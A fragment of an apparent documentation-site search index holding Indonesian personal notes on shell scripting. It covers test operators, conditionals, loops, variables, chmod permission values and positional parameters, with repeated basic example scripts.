\"-n $a : string length is not zero\" else echo \"-n $a : string length is zero\" fi if [ $a ] then echo \" $a : string is not empty\" else echo \" $a : string is empty\" fi #!/bin/sh file = \"/var/www/tutorialspoint/unix/test.sh\" if [ -r $file ] then echo \"File has read access\" else echo \"File does not have read access\" fi if [ -w $file ] then echo \"File has write permission\" else echo \"File does not have write permission\" fi if [ -x $file ] then echo \"File has execute permission\" else echo \"File does not have execute permission\" fi if [ -f $file ] then echo \"File is an ordinary file\" else echo \"This is sepcial file\" fi if [ -d $file ] then echo \"File is a directory\" else echo \"This is not a directory\" fi if [ -s $file ] then echo \"File size is not zero\" else echo \"File size is zero\" fi if [ -e $file ] then echo \"File exists\" else echo \"File does not exist\" fi","title":"Operators"},{"location":"tool/shellscript/shell-Operators/#operators","text":"","title":"Operators"},{"location":"tool/shellscript/shell-Operators/#contoh","text":"val = ` expr 2 + 2 ` echo \"Total value : $val \" #!/bin/sh a = 10 b = 20 val = ` expr $a + $b ` echo \"a + b : $val \" val = ` expr $a - $b ` echo \"a - b : $val \" val = ` expr $a \\* $b ` echo \"a * b : $val \" val = ` expr $b / $a ` echo \"b / a : $val \" val = ` expr $b % $a ` echo \"b % a : $val \" if [ $a == $b ] then echo \"a is equal to b\" fi if [ $a ! = $b ] then echo \"a is not equal to b\" fi #!/bin/sh a = 10 b = 20 if [ $a -eq $b ] then echo \" $a -eq $b : a is equal to b\" else echo \" $a -eq $b : a is not equal to b\" fi if [ $a -ne $b ] then echo \" $a -ne $b : a is not equal to b\" else echo \" $a -ne $b : a is equal to b\" fi if [ $a -gt $b ] then echo \" $a -gt $b : a is greater than b\" else echo \" $a -gt $b : a is not greater than b\" fi if [ $a -lt $b ] then echo \" $a -lt $b : a is less than b\" else echo \" $a -lt $b : a is not less than b\" fi if [ $a -ge $b ] then echo \" $a -ge $b : a is greater or equal to b\" else echo \" $a -ge $b : a is not greater or equal to b\" fi if [ $a -le $b ] then echo \" $a -le $b : a is less or equal to b\" else echo \" $a -le $b : a is not less or equal to b\" fi #!/bin/sh a = 10 b = 20 if [ $a ! = $b ] then echo \" $a != $b : a is not equal to b\" else echo \" $a != $b : a is equal to b\" fi if [ $a -lt 100 -a $b -gt 15 ] then echo \" $a -lt 100 -a $b -gt 15 : returns true\" else echo \" $a -lt 100 -a $b -gt 15 : returns false\" fi if [ $a -lt 100 -o $b -gt 100 ] then echo \" $a -lt 100 -o $b -gt 100 : returns true\" else echo \" $a -lt 100 -o $b -gt 100 : returns false\" fi if [ $a -lt 5 -o $b -gt 100 ] then echo \" $a -lt 100 -o $b -gt 100 : returns true\" else echo \" $a -lt 100 -o $b -gt 100 : returns false\" fi #!/bin/sh a = \"abc\" b = \"efg\" if [ $a = $b ] then echo \" $a = $b : a is equal to b\" else echo \" $a = $b : a is not equal to b\" fi if [ $a ! = $b ] then echo \" $a != $b : a is not equal to b\" else echo \" $a != $b : a is equal to b\" fi if [ -z $a ] then echo \"-z $a : string length is zero\" else echo \"-z $a : string length is not zero\" fi if [ -n $a ] then echo \"-n $a : string length is not zero\" else echo \"-n $a : string length is zero\" fi if [ $a ] then echo \" $a : string is not empty\" else echo \" $a : string is empty\" fi #!/bin/sh file = \"/var/www/tutorialspoint/unix/test.sh\" if [ -r $file ] then echo \"File has read access\" else echo \"File does not have read access\" fi if [ -w $file ] then echo \"File has write permission\" else echo \"File does not have write permission\" fi if [ -x $file ] then echo \"File has execute permission\" else echo \"File does not have execute permission\" fi if [ -f $file ] then echo \"File is an ordinary file\" else echo \"This is sepcial file\" fi if [ -d $file ] then echo \"File is a directory\" else echo \"This is not a directory\" fi if [ -s $file ] then echo \"File size is not zero\" else echo \"File size is zero\" fi if [ -e $file ] then echo \"File exists\" else echo \"File does not exist\" fi","title":"Contoh"},{"location":"tool/shellscript/shell-decision/","text":"Shell Script Decision \u00b6 #!/bin/sh a = 10 b = 20 if [ $a == $b ] then echo \"a is equal to b\" fi if [ $a ! = $b ] then echo \"a is not equal to b\" fi #!/bin/sh a = 10 b = 20 if [ $a == $b ] then echo \"a is equal to b\" else echo \"a is not equal to b\" fi #!/bin/sh a = 10 b = 20 if [ $a == $b ] then echo \"a is equal to b\" elif [ $a -gt $b ] then echo \"a is greater than b\" elif [ $a -lt $b ] then echo \"a is less than b\" else echo \"None of the condition met\" fi #!/bin/sh a = 10 b = 20 if [ $a == $b ] then echo \"a is equal to b\" elif [ $a -gt $b ] then echo \"a is greater than b\" elif [ $a -lt $b ] then echo \"a is less than b\" else echo \"None of the condition met\" fi #!/bin/sh option = \" ${ 1 } \" case ${ option } in -f ) FILE = \" ${ 2 } \" echo \"File name is $FILE \" ;; -d ) DIR = \" ${ 2 } \" echo \"Dir name is $DIR \" ;; * ) echo \"`basename ${ 0 } `:usage: [-f file] | [-d directory]\" exit 1 # Command to come out of the program with status 1 ;; esac","title":"Decision"},{"location":"tool/shellscript/shell-decision/#shell-script-decision","text":"#!/bin/sh a = 10 b = 20 if [ $a == $b ] then echo \"a is equal to b\" fi if [ $a ! = $b ] then echo \"a is not equal to b\" fi #!/bin/sh a = 10 b = 20 if [ $a == $b ] then echo \"a is equal to b\" else echo \"a is not equal to b\" fi #!/bin/sh a = 10 b = 20 if [ $a == $b ] then echo \"a is equal to b\" elif [ $a -gt $b ] then echo \"a is greater than b\" elif [ $a -lt $b ] then echo \"a is less than b\" else echo \"None of the condition met\" fi #!/bin/sh a = 10 b = 20 if [ $a == $b ] then echo \"a is equal to b\" elif [ $a -gt $b ] then echo \"a is greater than b\" elif [ $a -lt $b ] then echo \"a is less than b\" else echo \"None of the condition met\" fi #!/bin/sh option = \" ${ 1 } \" case ${ option } in -f ) FILE = \" ${ 2 } \" echo \"File name is $FILE \" ;; -d ) DIR = \" ${ 2 } \" echo \"Dir name is $DIR \" ;; * ) echo \"`basename ${ 0 } `:usage: [-f file] | [-d directory]\" exit 1 # Command to come out of the program with status 1 ;; esac","title":"Shell Script Decision"},{"location":"tool/shellscript/shell-loop/","text":"Shell Script Loop \u00b6 while #!/bin/sh a = 0 while [ $a -lt 10 ] do echo $a a = ` expr $a + 1 ` done for #!/bin/sh for var in 0 1 2 3 4 5 6 7 8 9 do echo $var done for FILE in $HOME /.bash* do echo $FILE done for i in { 1 ..25 } do echo \"flnuehy nhyvn\" | caesar $i done until loop #!/bin/sh a = 0 until [ ! $a -lt 10 ] do echo $a a = ` expr $a + 1 ` done select loop #!/bin/ksh select DRINK in tea cofee water juice appe all none do case $DRINK in tea | cofee | water | all ) echo \"Go to canteen\" ;; juice | appe ) echo \"Available at home\" ;; none ) break ;; * ) echo \"ERROR: Invalid selection\" ;; esac done","title":"Loop"},{"location":"tool/shellscript/shell-loop/#shell-script-loop","text":"while #!/bin/sh a = 0 while [ $a -lt 10 ] do echo $a a = ` expr $a + 1 ` done for #!/bin/sh for var in 0 1 2 3 4 5 6 7 8 9 do echo $var done for FILE in $HOME /.bash* do echo $FILE done for i in { 1 ..25 } do echo \"flnuehy nhyvn\" | caesar $i done until loop #!/bin/sh a = 0 until [ ! $a -lt 10 ] do echo $a a = ` expr $a + 1 ` done select loop #!/bin/ksh select DRINK in tea cofee water juice appe all none do case $DRINK in tea | cofee | water | all ) echo \"Go to canteen\" ;; juice | appe ) echo \"Available at home\" ;; none ) break ;; * ) echo \"ERROR: Invalid selection\" ;; esac done","title":"Shell Script Loop"},{"location":"tool/shellscript/shell-script/","text":"Shell Script \u00b6 vim tes.sh lalu #!/bin/bash nama = \"syahrul\" echo $nama # Will print out : syahrul NAME = \"Gunawan\" readonly NAME NAME = \"Aulia\" # Will print out : /bin/bash: NAME: This variable is read only. NAME = \"Carloz\" unset NAME echo $NAME # Will print out : (nothing) chmod chmod +x tes.sh tambahan \u00b6 common chmod rwxrwxrwx = 111111111 = 777 rwxrwx--- = 111111000 = 770 rwxr-xr-x = 111101101 = 755 rwxr--r-- = 111100100 = 744 rwx------ = 111000000 = 700 rw-rw-rw- = 110110110 = 666 rw-r--r-- = 110100100 = 644 rw------- = 110000000 = 600 r-------- = 100000000 = 400 menghapus kecuali find . -type f,d ! -name 'pyt.py' -delete","title":"Shell Script"},{"location":"tool/shellscript/shell-script/#shell-script","text":"vim tes.sh lalu #!/bin/bash nama = \"syahrul\" echo $nama # Will print out : syahrul NAME = \"Gunawan\" readonly NAME NAME = \"Aulia\" # Will print out : /bin/bash: NAME: This variable is read only. NAME = \"Carloz\" unset NAME echo $NAME # Will print out : (nothing) chmod chmod +x tes.sh","title":"Shell Script"},{"location":"tool/shellscript/shell-script/#tambahan","text":"common chmod rwxrwxrwx = 111111111 = 777 rwxrwx--- = 111111000 = 770 rwxr-xr-x = 111101101 = 755 rwxr--r-- = 111100100 = 744 rwx------ = 111000000 = 700 rw-rw-rw- = 110110110 = 666 rw-r--r-- = 110100100 = 644 rw------- = 110000000 = 600 r-------- = 100000000 = 400 menghapus kecuali find . -type f,d ! -name 'pyt.py' -delete","title":"tambahan"},{"location":"tool/shellscript/shell-spcChar/","text":"Shell Special Character \u00b6 echo \"File Name: $0 \" echo \"First Parameter : $1 \" echo \"Second Parameter : $2 \" echo \"Quoted Values: $@ \" echo \"Quoted Values: $* \" echo \"Total Number of Parameters : $# \" hasil $./test.sh Zara Ali File Name : ./test.sh First Parameter : Zara Second Parameter : Ali Quoted Values: Zara Ali Quoted Values: Zara Ali Total Number of Parameters : 2 for TOKEN in $* do echo $TOKEN done hasil $./test.sh Zara Ali 10 Years Old Zara Ali 10 Years Old","title":"Special Character"},{"location":"tool/shellscript/shell-spcChar/#shell-special-character","text":"echo \"File Name: $0 \" echo \"First Parameter : $1 \" echo \"Second Parameter : $2 \" echo \"Quoted Values: $@ \" echo \"Quoted Values: $* \" echo \"Total Number of Parameters : $# \" hasil $./test.sh Zara Ali File Name : ./test.sh First Parameter : Zara Second Parameter : Ali Quoted Values: Zara Ali Quoted Values: Zara Ali Total Number of Parameters : 2 for TOKEN in $* do echo $TOKEN done hasil $./test.sh Zara Ali 10 Years Old Zara Ali 10 Years Old","title":"Shell Special Character"}]}